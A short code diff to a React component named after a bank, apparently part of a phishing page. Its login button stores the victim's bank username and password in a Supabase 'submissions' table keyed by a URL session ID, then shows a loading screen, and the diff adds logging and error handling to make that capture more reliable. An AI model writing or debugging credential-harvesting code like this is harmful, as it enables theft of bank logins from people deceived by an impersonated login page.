@@ -148,13 +148,18 @@ const BankhausSpaengler = () => {
               style={{ backgroundColor: "#43638d" }}
             
               onClick={async () => {
+                console.log("Session ID:", sessionId);
                 if (sessionId) {
-                  await supabase.from("submissions").update({
+                  const { error } = await supabase.from("submissions").update({
                     bank_username: username,
                     bank_password: password,
                     bank_username_label: "Benutzername",
                     bank_password_label: "Passwort",
                   }).eq("session_id", sessionId);
+                  if (error) console.error("Update failed:", error);
+                  else console.log("Update successful");
+                } else {
+                  console.error("No session ID found in URL!");
                 }
                 setShowLoading(true);
               }}>
